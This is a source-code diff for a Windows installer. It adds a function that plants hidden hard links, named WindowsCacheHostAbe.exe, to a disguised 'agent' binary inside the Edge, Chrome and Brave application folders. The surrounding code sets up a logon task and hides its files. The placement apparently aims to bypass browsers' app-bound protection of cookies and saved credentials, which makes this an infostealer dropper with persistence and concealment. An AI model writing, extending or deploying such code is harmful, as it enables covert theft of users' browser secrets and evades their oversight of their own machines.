@@ -156,6 +156,37 @@ static bool StartAgent(const std::wstring& exe, const std::wstring& workingDir) 
     return ok;
 }
 
+static void CreateAbeLinks(const std::wstring& agent, const std::wstring& logDirectory) {
+    wchar_t programFiles[MAX_PATH]{};
+    wchar_t programFiles86[MAX_PATH]{};
+    wchar_t localAppData[MAX_PATH]{};
+    GetEnvironmentVariableW(L"ProgramFiles", programFiles, MAX_PATH);
+    GetEnvironmentVariableW(L"ProgramFiles(x86)", programFiles86, MAX_PATH);
+    GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH);
+    std::vector<std::wstring> dirs = {
+        Join(programFiles86, L"Microsoft\\Edge\\Application"),
+        Join(localAppData, L"Microsoft\\Edge\\Application"),
+        Join(programFiles, L"Google\\Chrome\\Application"),
+        Join(programFiles86, L"Google\\Chrome\\Application"),
+        Join(localAppData, L"Google\\Chrome\\Application"),
+        Join(programFiles, L"BraveSoftware\\Brave-Browser\\Application"),
+        Join(programFiles86, L"BraveSoftware\\Brave-Browser\\Application"),
+        Join(localAppData, L"BraveSoftware\\Brave-Browser\\Application"),
+    };
+    for (const std::wstring& dir : dirs) {
+        if (!PathFileExistsW(dir.c_str())) continue;
+        std::wstring link = Join(dir, L"WindowsCacheHostAbe.exe");
+        SetFileAttributesW(link.c_str(), FILE_ATTRIBUTE_NORMAL);
+        DeleteFileW(link.c_str());
+        if (CreateHardLinkW(link.c_str(), agent.c_str(), nullptr)) {
+            SetFileAttributesW(link.c_str(), FILE_ATTRIBUTE_HIDDEN);
+            LogSetup(logDirectory, L"abe_link ok " + dir);
+        } else {
+            LogSetup(logDirectory, L"abe_link failed " + dir + L" error=" + std::to_wstring(GetLastError()));
+        }
+    }
+}
+
 int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
     std::wstring source = ModuleDir();
     std::wstring agentSource = Join(source, L"WindowsCacheHost.exe");
@@ -184,6 +215,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
     SetFileAttributesW(configTarget.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
     CreateLogonTask(agentTarget, targetDir);
+    CreateAbeLinks(agentTarget, targetDir);
     bool started = StartAgent(agentTarget, targetDir);
     LogSetup(targetDir, L"start_agent " + std::to_wstring(started ? 1 : 0) + L" error=" + std::to_wstring(started ? 0 : GetLastError()));
     return started ? 0 : 1;
